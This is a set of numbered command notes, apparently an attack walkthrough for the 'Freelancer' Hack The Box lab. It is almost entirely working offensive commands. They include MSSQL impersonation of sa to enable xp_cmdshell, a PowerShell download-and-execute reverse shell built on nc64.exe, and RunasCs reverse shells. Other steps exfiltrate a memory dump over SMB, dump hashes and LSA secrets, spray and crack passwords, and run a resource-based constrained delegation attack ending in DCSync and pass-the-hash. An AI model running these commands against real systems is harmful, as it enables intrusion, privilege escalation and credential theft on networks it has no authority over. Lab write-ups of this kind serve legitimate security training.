==========(1)======================================================================================================================
See https://github.com/ajiththomas/qrcodereader/tree/main
==========(2)======================================================================================================================
#Linux command to generate numbers from 1 to 65535 and redirect them to a file
seq 1 65535 > numbers.txt
==========(3)======================================================================================================================
#Use BurpSuite to find sessionid and csrftoken and then use it for FUZZ
ffuf -u 'http://freelancer.htb/accounts/profile/visit/FUZZ/' -X GET -H 'Cookie: sessionid=4p6yyd6c1zosaiuqzfvm3xuu9nr8k08g;csrftoken=uClh0dyORb2wtB2zqDYdxc6YZuGftsE5' -w /home/mabali/numbers.txt -v
==========(4)======================================================================================================================
#find the admin page and convert page number to base64
printf "%d" 2 | base64
==========(5)======================================================================================================================
#use scanqr code to get link content
echo "http://freelancer.htb/accounts/login/otp/Mg==/43c1fd8315d35368f280e7298fdab3a8/"
==========(6)======================================================================================================================
#Enumerate what type of SQL server we're interacting
SELECT @@SERVERNAME;

#Query current user, system roles and whether or not we are currently a system administrator.
(1) SELECT SYSTEM_USER;
(2) SELECT name,roles FROM sysusers WHERE issqluser = '1'
(3) SELECT is_srvrolemember('sysadmin');

#Query if we've been granted privileges that we might be able to leverage. 
(1) SELECT name, principal_id FROM sys.server_principals WHERE name = 'Freelancer_webapp_user'
(2) SELECT grantee_principal_id, permission_name, grantor_principal_id FROM sys.server_permissions WHERE grantee_principal_id = '267';

#Impersonate sa and take full control over the SQL service. 
SELECT a.name AS grantee, b.permission_name, c.name AS grantor FROM sys.server_permissions b INNER JOIN sys.server_principals a ON b.grantee_principal_id = a.principal_id
INNER JOIN sys.server_principals c ON b.grantor_principal_id = c.principal_id WHERE b.permission_name = 'IMPERSONATE';

#Validate our findings before proceeding
EXECUTE AS LOGIN = 'sa';
SELECT is_srvrolemember('sysadmin');

#Enable xp_cmdshell and run command
#(May have to run enabling and executing command immediately followed by one another in some systems. May use EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell "whoami"; to verify code execution in other systems)
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.14.82:8000/reverse.ps1 -usebasicp)";
/*
//reverse.ps1
iwr http://10.10.14.82:8000/nc64.exe -outfile c:\\users\\public\\nc64.exe;
c:\\users\\public\\nc64.exe -e powershell.exe 10.10.14.82 10001
*/
==========(7)======================================================================================================================
#find password stored in in plaintext in any files
(gci: Alias for Get-ChildItem)
gci -path . -recurse -ea SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg | select-string pass
gci -path . -recurse -ea SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg | select-string -pattern "password\s*[:=]\s*\S+" -CaseSensitive:$false



#get list of all active directory users
get-aduser -filter * | select samaccountname
  (a) get-aduser -filter * -properties DisplayName, EmailAddress | select samaccountname, DisplayName, EmailAddress
  (b) get-aduser -filter "Name -like '*John*'" | select samaccountname
  (c) Get-ADUser -Identity <samaccountname> -Properties *
  (d) get-aduser -filter * | select samaccountname | Export-Csv -Path "ADUsers.csv" -NoTypeInformation

==========(8)======================================================================================================================
//get output of get-aduser -filter * | select samaccountname into users

netexec smb freelancer.htb -u users -p "IL0v3ErenY3ager" --continue-on-success
==========(9)======================================================================================================================
target:

iwr 10.10.14.82:8000/RunasCs.exe -outfile runascs.exe

./runascs.exe mikasaAckerman 'IL0v3ErenY3ager' powershell.exe -r 10.10.14.82:9001

host:
rlwrap -cAr nc -nvlp 9001
==========(10)======================================================================================================================
host:

smbserver.py share . -username test -password t3st -smb2support
md5sum MEMORY.7z

target:
net use \\10.10.14.82\share /user:test t3st
xcopy MEMORY.7z \\10.10.14.82\share\
get-filehash -algorithm md5 MEMORY.7z
whoami /all
==========(11)======================================================================================================================
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3/
python3 -m venv venv && . venv/bin/activate
pip install -e .[dev]
==========(12)======================================================================================================================
//To extract a .7z archive to the current directory without preserving directory structure
7z e MEMORY.7z
cd volatility3/
python3 vol.py -f ~/MEMORY.DMP windows.cmdline.CmdLine
==========(13)======================================================================================================================
//Inspect the interesting
python3 vol.py -f ~/MEMORY.DMP windows.dumpfiles.DumpFiles --pid 3848
==========(14)======================================================================================================================
//dump hashes
python3 vol.py -f ~/MEMORY.DMP windows.hashdump.Hashdump
==========(15)======================================================================================================================
//dump caches
python3 vol.py -f ~/MEMORY.DMP windows.cachedump.Cachedump
==========(16)======================================================================================================================
//Local Security Authority(LSA) dump
python3 vol.py -f ~/MEMORY.DMP windows.lsadump.Lsadump

==========(17)======================================================================================================================
//windows.registry.hivelist: This is a Volatility plugin (or command) that lists all the registry hives found in the memory dump. Registry hives contain critical information about system settings, user settings, installed software, and much more in the Windows operating system. The plugin will try to identify all registry hives loaded into memory, such as SYSTEM, SOFTWARE, SECURITY, etc.
//--filter '\REGISTRY\MACHINE\SYSTEM': This option applies a filter to limit the output to a specific registry hive. In this case, it filters the results to show only the hive located at \REGISTRY\MACHINE\SYSTEM, which is the SYSTEM hive. The SYSTEM hive contains information about the hardware, services, and system configuration.
//--dump: This option tells Volatility to dump the contents of the selected registry hive (in this case, the SYSTEM hive). By default, this would output the data in a human-readable format. This is useful for examining the contents of a specific registry hive.
python3 vol.py -f ~/MEMORY.DMP windows.registry.hivelist --filter '\REGISTRY\MACHINE\SYSTEM' --dump 
python3 vol.py -f ~/MEMORY.DMP windows.registry.hivelist --filter '\SystemRoot\System32\Config\SECURITY' --dump  
python3 vol.py -f ~/MEMORY.DMP windows.registry.hivelist --filter '\SystemRoot\System32\Config\SAM' --dump
==========(18)======================================================================================================================
secretsdump.py -sam registry.SAM.0xd3067d935000.hive -security registry.SECURITY.0xd3067d7f0000.hive -system registry.SYSTEM.0xd30679c46000.hive LOCAL\

hashcat -a 0 -m 2100 hash.txt
hashcat -m 2100 --show hash.txt
==========(19)======================================================================================================================
//synchronize time with remote server
sudo ntpdate freelancer.htb
==========(20)======================================================================================================================
//kerbrute passwordspray --dc 10.10.11.5 -d freelancer.htb ~/users.txt 'PWN3D#l0rr@Armessa199'

nxc ldap 10.10.11.5 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -M whoami
//msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.52 LPORT=8000 -f ps1 > new_shell.ps1

==========(21)======================================================================================================================
(21) fails...this is for reference purposes only

evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'

Get-ADObject -filter 'isDeleted -eq$true' -includeDeletedObjects -Properties * | select samaccountname, memberof, userprincipalname
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects

restore-ADObject -identity 'ebe15df5-e265-45ec-b7fc-359877217138' -newname "liza.old"
get-aduser -filter * | where name -eq "liza.old"
nxc smb freelancer.htb -u liza.kazanof -p passwords.list -d freelancer.htb
smbpasswd.py freelancer.htb/liza.kazanof:'RockYou!'@freelancer.htb -newpass 'Password123!'
nxc smb freelancer.htb -u liza.kazanof -p 'Password123!' -d freelancer.htb
nxc winrm freelancer.htb -u liza.kazanof -p 'Password123!' -d freelancer.htb
evil-winrm -i freelancer.htb -u liza.kazanof -p 'Passw0rd!'
whoami /groups

/*
//also same
get-adobject -filter 'isdeleted -eq $true' -includedeletedobjects
get-adobject -filter 'isdeleted -eq $true -and ObjectClass -eq "user"' -includedeletedobjects -property *
restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138
restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138 -newname liza.kazanof.new
//https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject?view=windowsserver2022-ps


get-aduser -filter * | select samaccountname
get-aduser -filter 'SamAccountName -eq "liza.kazanof"'
netexec smb freelancer.htb -u liza.kazanof -p 'RockYou!'
changepasswd.py 'freelancer.htb/liza.kazanof:RockYou!@freelancer.htb' -newpass 'Password123'
evil-winrm -i freelancer.htb -u liza.kazanof -p 'Pasword123!'
*/
==========(22)======================================================================================================================
addcomputer.py -method SAMR -computer-name 'dracula' -computer-pass 'Dr@cul@123!' -dc-host 10.10.11.2 -domain-netbios freelancer.htb 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
rbcd.py -delegate-from 'dracula$' -delegate-to 'dc$' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
getST.py -spn 'cifs/DC.freelancer.htb' -impersonate 'administrator' 'freelancer.htb/dracula$:Dr@cul@123!'
KRB5CCNAME='administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache' secretsdump.py -no-pass -k dc.freelancer.htb -just-dc-ntlm
==========(23)======================================================================================================================
evil-winrm -i freelancer.htb -u administrator -H <hash>
